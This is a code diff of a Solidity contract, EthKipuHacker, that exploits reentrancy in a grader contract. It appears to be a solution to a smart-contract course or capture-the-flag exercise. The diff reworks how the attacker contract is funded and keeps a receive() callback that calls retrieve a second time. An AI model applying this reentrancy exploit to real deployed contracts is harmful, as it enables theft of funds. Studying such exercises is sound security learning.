@@ -17,12 +17,17 @@ contract EthKipuHacker {
         i_owner = msg.sender;
     }
 
-    function hack() external payable {
+    function deposit() external payable {}
+
+    function hack() external {
         require(msg.sender == i_owner, "You're not the owner");
-        require(msg.value > 3, "Must send more than 4 wei");
+        require(
+            address(this).balance > 3,
+            "Contract mustbe funded with at least 4 wei"
+        );
 
         reentrancyLock = false;
-        i_grader.retrieve{value: msg.value}();
+        i_grader.retrieve{value: 4}();
     }
 
     function doGradeMe(string calldata name) external {
@@ -31,11 +36,9 @@ contract EthKipuHacker {
     }
 
     receive() external payable {
-        // if (address(this).balance > 3) {
         if (!reentrancyLock) {
             reentrancyLock = true;
             i_grader.retrieve{value: 4}();
         }
-        // }
     }
 }
